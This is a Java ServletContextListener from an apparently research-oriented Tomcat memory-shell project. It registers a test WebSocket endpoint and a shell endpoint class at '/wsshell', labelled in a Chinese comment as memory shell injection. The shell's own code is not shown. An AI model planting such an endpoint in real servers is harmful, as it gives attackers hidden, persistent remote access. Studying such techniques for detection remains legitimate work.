package com.tomcatmemshell.websocket;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.websocket.DeploymentException;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;

public class WebSocketConfig implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        ServerContainer container = (ServerContainer) sce.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
        // 测试 websocket
        ServerEndpointConfig config = ServerEndpointConfig.Builder.create(MyWebSocketEndpoint.class, "/websocket").build();
        // websocket 内存马注入
        ServerEndpointConfig config2 = ServerEndpointConfig.Builder.create(WSEndpointShell.class, "/wsshell").build();
        try {
            container.addEndpoint(config);
            container.addEndpoint(config2);
        } catch (DeploymentException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        // 处理上下文销毁
    }
}